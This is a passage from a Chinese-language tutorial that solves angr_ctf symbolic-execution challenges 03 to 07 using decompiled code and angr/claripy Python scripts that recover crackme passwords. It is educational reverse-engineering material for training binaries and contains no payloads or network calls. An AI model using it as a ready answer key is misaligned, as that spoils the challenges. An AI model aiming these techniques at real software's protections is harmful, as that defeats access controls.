[ebp-14h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v3[<span class="number">4</span>]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readgsdword(0x14u);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%x %x %x&quot;</span>, &amp;v1, &amp;v2, v3);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面两行代码我们发现，在getuserinput这个函数里，对v1、v2、v3进行了输入，然后只用了v1，然后看汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0804892A 68 93 8A 04 08                push    offset aXXX                     ; &quot;%x %x %x&quot;</span><br><span class="line">.text:0804892F E8 9C FA FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:0804892F</span><br><span class="line">.text:08048934 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048937 8B 4D E8                      mov     ecx, [ebp+var_18]</span><br><span class="line">.text:0804893A 89 C8                         mov     eax, ecx</span><br><span class="line">.text:0804893C 8B 4D EC                      mov     ecx, [ebp+var_14]</span><br><span class="line">.text:0804893F 89 CB                         mov     ebx, ecx</span><br><span class="line">.text:08048941 8B 4D F0                      mov     ecx, [ebp+var_10]</span><br><span class="line">.text:08048944 89 CA                         mov     edx, ecx</span><br><span class="line">.text:08048946 90                            nop</span><br></pre></td></tr></table></figure><p>发现三个值传给 了eax ebx ecx，我们可以在输入函数之后，利用向量给 initial_state.regs.eax  ebx edx，进行向量的赋值，在后面进行状态查看即可，分析完后，我这里对关键的exp 代码进行分析</p><p>（1）.start_address&#x3D;0x08048980<br>    initial_state&#x3D;proj.factory.blank_state(addr&#x3D;start_address) 这里在输入函数之后开始空白块，我这里理解的空白块是从这里开始进行向下执行，并且绕过程序自己的输入函数，我们自己进行对reg来操作赋值</p><p>（2）.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">passwd_0=claripy.BVS(<span class="string">&#x27;passwd_0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_1=claripy.BVS(<span class="string">&#x27;passwd_1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_2=claripy.BVS(<span class="string">&#x27;passwd_2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    initial_state.regs.eax=passwd_0</span><br><span class="line">    initial_state.regs.ebx=passwd_1</span><br><span class="line">    initial_state.regs.edx=passwd_2</span><br></pre></td></tr></table></figure><p>用claripy进行向量的创建，创建3个向量，因为是int32位，所以这里后面写成了32，然后再把三个向量导入到eax ebx edx</p><p>（3）.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simgr=proj.factory.simgr(initial_state)</span><br><span class="line">simgr.explore(find=find_path,avoid=avoid_path)</span><br></pre></td></tr></table></figure><p>然后进行模拟执行并且查询</p><p>（4) .</p><p>然后通过simgr.found获取解决后的state（状态），</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">solution0=solution_state.solver.eval(passwd_0)</span><br><span class="line">        solution1=solution_state.solver.eval(passwd_1)</span><br><span class="line">        solution2=solution_state.solver.eval(passwd_2)</span><br></pre></td></tr></table></figure><p>然后再用solution_state.solver.eval获取状态值，获取到状态值打印即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avoid_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./03_angr_symbolic_registers&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    start_address=<span class="number">0x08048980</span></span><br><span class="line">    initial_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    passwd_0=claripy.BVS(<span class="string">&#x27;passwd_0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_1=claripy.BVS(<span class="string">&#x27;passwd_1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_2=claripy.BVS(<span class="string">&#x27;passwd_2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    initial_state.regs.eax=passwd_0</span><br><span class="line">    initial_state.regs.ebx=passwd_1</span><br><span class="line">    initial_state.regs.edx=passwd_2</span><br><span class="line"></span><br><span class="line">    simgr=proj.factory.simgr(initial_state)</span><br><span class="line">    simgr.explore(find=find_path,avoid=avoid_path)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd_0)</span><br><span class="line">        solution1=solution_state.solver.<span class="built_in">eval</span>(passwd_1)</span><br><span class="line">        solution2=solution_state.solver.<span class="built_in">eval</span>(passwd_2)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;passwd0:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution0)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;passwd1:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution1)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;passwd2:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution2)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Could not find the solution!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="五、04-stack"><a href="#五、04-stack" class="headerlink" title="五、04 stack"></a>五、04 stack</h2><p>这里是对stack的一个符号化，对栈的化，就得注意栈的分布了，esp和ebp寄存器这些</p><p>我们还是选关键代码进行分析</p><p>（1）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passwd0=claripy.BVS(<span class="string">&quot;passwd0&quot;</span>,<span class="number">32</span>)  <span class="comment">#这里创建了向量</span></span><br><span class="line">passwd1=claripy.BVS(<span class="string">&quot;passwd1&quot;</span>,<span class="number">32</span>)   <span class="comment">#</span></span><br><span class="line">initial_state.regs.ebp=initial_state.regs.esp  </span><br><span class="line">initial_state.regs.esp-=<span class="number">0x8</span> <span class="comment">#scanf</span></span><br><span class="line">initial_state.stack_push(passwd0)</span><br><span class="line">initial_state.stack_push(passwd1)</span><br></pre></td></tr></table></figure><p>第一步先把寄存器esp给了ebp，然后让esp-0x8，这里减0x8的原因，我推测有两个原因，一是联系上下文、二是开辟栈空间</p><p>然后把我们创建的向量放到stack上即可，下面代码还是老一套，solver.eval(向量状态)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./04_angr_symbolic_stack&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line"></span><br><span class="line">    start_address=<span class="number">0x8048697</span></span><br><span class="line">    initial_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    passwd0=claripy.BVS(<span class="string">&quot;passwd0&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd1=claripy.BVS(<span class="string">&quot;passwd1&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    initial_state.regs.ebp=initial_state.regs.esp</span><br><span class="line">    initial_state.regs.esp-=<span class="number">0x8</span> <span class="comment">#scanf</span></span><br><span class="line">    initial_state.stack_push(passwd0)</span><br><span class="line">    initial_state.stack_push(passwd1)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#initial_state.regs.esp-=12  #.text:08048682 8D 45 F0                      lea     eax, [ebp+var_10]the relative position of esp when return from scanf()</span></span><br><span class="line">    simgr=proj.factory.simgr(initial_state)</span><br><span class="line">    simgr.explore(find=<span class="number">0x80486E1</span>,avoid=<span class="number">0x80486CF</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd0)</span><br><span class="line">        solution1=solution_state.solver.<span class="built_in">eval</span>(passwd1)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd0:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution0)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution1)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Colindd not !!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><p>六、05 me’mory</p><p>这道题是对memory内存进行符号化</p><p>我们看下源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(user_input, <span class="number">0</span>, <span class="number">0x21</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s %8s %8s&quot;</span>, user_input, &amp;unk_A1BA1C8, &amp;unk_A1BA1D0, &amp;unk_A1BA1D8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0xA1BA1C0</span>) = complex_function(*(<span class="type">char</span> *)(i + <span class="number">0xA1BA1C0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(user_input, <span class="string">&quot;NJPURZPCDYEAXCSJZJMPSOMBFDDLHBVN&quot;</span>, <span class="number">0x20</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过以上代码，我们发现是往内存bss段里读入4个8bytes，所以这里我们利用一个为内存赋值的语句</p><p>init_state.memory.store(address,passwd0)   这个是把passwd0赋值给address这个地址的里</p><p>然后我们创建4个变量并且把这个四个变量放到读入的内存里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address=<span class="number">0xA1BA1C0</span></span><br><span class="line">init_state.memory.store(address,passwd0)  <span class="comment">#放到</span></span><br><span class="line">init_state.memory.store(address+<span class="number">0x8</span>,passwd1)</span><br><span class="line">init_state.memory.store(address+<span class="number">0x10</span>,passwd2)</span><br><span class="line">init_state.memory.store(address+<span class="number">0x18</span>,passwd3)</span><br></pre></td></tr></table></figure><p>这里注意字节的增长</p><p>然后下面就是按照之前的方法获取相应的状态值即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./05_angr_symbolic_memory&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    start_address=<span class="number">0x8048601</span></span><br><span class="line">    init_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line">    </span><br><span class="line">    passwd0=claripy.BVS(<span class="string">&quot;passwd0&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    passwd1=claripy.BVS(<span class="string">&quot;passwd1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    passwd2=claripy.BVS(<span class="string">&quot;passwd2&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    passwd3=claripy.BVS(<span class="string">&quot;passwd3&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    address=<span class="number">0xA1BA1C0</span></span><br><span class="line">    init_state.memory.store(address,passwd0)</span><br><span class="line">    init_state.memory.store(address+<span class="number">0x8</span>,passwd1)</span><br><span class="line">    init_state.memory.store(address+<span class="number">0x10</span>,passwd2)</span><br><span class="line">    init_state.memory.store(address+<span class="number">0x18</span>,passwd3)</span><br><span class="line"></span><br><span class="line">    simgr=proj.factory.simgr(init_state)</span><br><span class="line">    simgr.explore(find=<span class="number">0x804866A</span>,avoid=<span class="number">0x8048658</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd0,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        solution1=solution_state.solver.<span class="built_in">eval</span>(passwd1,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        solution2=solution_state.solver.<span class="built_in">eval</span>(passwd2,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        solution3=solution_state.solver.<span class="built_in">eval</span>(passwd3,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd0:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution0))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution1))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd2:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution2))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd3:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution3))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;couln not !!!!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="七、06-动态memory"><a href="#七、06-动态memory" class="headerlink" title="七、06 动态memory"></a>七、06 动态memory</h2><p>这里是动态的chunk，malloc出来的，这里我们在动态里进行伪造fakechunk，然后再往这个伪造的chunk进行放入向量即可</p><p>先看下源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  buffer0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  buffer1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer0, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer1, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s&quot;</span>, buffer0, buffer1, v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &amp;buffer0[i];</span><br><span class="line">    *v3 = complex_function(buffer0[i], i);</span><br><span class="line">    v4 = &amp;buffer1[i];</span><br><span class="line">    *v4 = complex_function(buffer1[i], i + <span class="number">32</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buffer0, <span class="string">&quot;UODXLZBI&quot;</span>, <span class="number">8u</span>) &amp;&amp; !<span class="built_in">strncmp</span>(buffer1, <span class="string">&quot;UAORRAYF&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(buffer0);</span><br><span class="line">  <span class="built_in">free</span>(buffer1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取buffer0和buffer1的地址对这个地址进行fake即可</p><p>以下是我伪造的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">buf0=<span class="number">0xABCC8A4</span></span><br><span class="line">buf1=<span class="number">0xABCC8AC</span></span><br><span class="line">fake_buf0=<span class="number">0xAAAAA10</span></span><br><span class="line">fake_buf1=<span class="number">0xAAAAA20</span></span><br><span class="line">p1=claripy.BVS(<span class="string">&quot;p1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">p2=claripy.BVS(<span class="string">&quot;p2&quot;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">init_state.memory.store(buf0,fake_buf0,endness=proj.arch.memory_endness)</span><br><span class="line">init_state.memory.store(buf1,fake_buf1,endness=proj.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">init_state.memory.store(fake_buf0,p1)</span><br><span class="line">init_state.memory.store(fake_buf1,p2)</span><br></pre></td></tr></table></figure><p>然后下一步一把梭获取状态值即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avoid_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./06_angr_symbolic_dynamic_memory&quot;</span></span><br><span class="line"></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line"></span><br><span class="line">    start_address=<span class="number">0x8048699</span></span><br><span class="line"></span><br><span class="line">    init_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    buf0=<span class="number">0xABCC8A4</span></span><br><span class="line">    buf1=<span class="number">0xABCC8AC</span></span><br><span class="line">    fake_buf0=<span class="number">0xAAAAA10</span></span><br><span class="line">    fake_buf1=<span class="number">0xAAAAA20</span></span><br><span class="line">    p1=claripy.BVS(<span class="string">&quot;p1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    p2=claripy.BVS(<span class="string">&quot;p2&quot;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(buf0,fake_buf0,endness=proj.arch.memory_endness)</span><br><span class="line">    init_state.memory.store(buf1,fake_buf1,endness=proj.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(fake_buf0,p1)</span><br><span class="line">    init_state.memory.store(fake_buf1,p2)</span><br><span class="line"></span><br><span class="line">    simgr=proj.factory.simgr(init_state)</span><br><span class="line">    simgr.explore(find=find_path,avoid=avoid_path)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        sol_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        p1=sol_state.solver.<span class="built_in">eval</span>(p1,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        p2=sol_state.solver.<span class="built_in">eval</span>(p2,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p1))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p2:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Colud not!!!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><p>八、07  符号fiile文件</p><p>这个题是对file文件进行符号化</p><p>我们看下题目代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span 